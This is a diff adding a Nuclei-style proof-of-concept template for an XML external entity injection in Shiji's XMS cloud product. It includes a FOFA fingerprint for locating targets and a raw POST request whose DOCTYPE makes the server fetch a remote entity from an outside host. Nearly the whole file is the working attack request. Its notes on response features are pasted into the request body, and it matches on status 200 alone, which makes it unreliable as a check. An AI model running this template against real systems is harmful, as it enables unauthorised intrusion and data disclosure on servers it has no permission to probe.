@@ -1,0 +1,60 @@
+id: poc-tskbzptzim3apusg
+info:
+  name: 西软云 XML 实体注入漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tskbzptzim3apusg'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tskbzptzim3apusg
+    fofa: app="shiji-西软云XMS"
+http:
+- raw:
+  - 'POST /ItfServerRS/rest/ideas/getresponseasync HTTP/1.1
+
+
+    Cache-Control: max-age=0
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Cookie: JSESSIONID=D951D74512C15DD4E951A1F0A52CB0F9
+
+
+    Connection: close
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://wwwbaidu.com"> %remote;]>
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    error
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
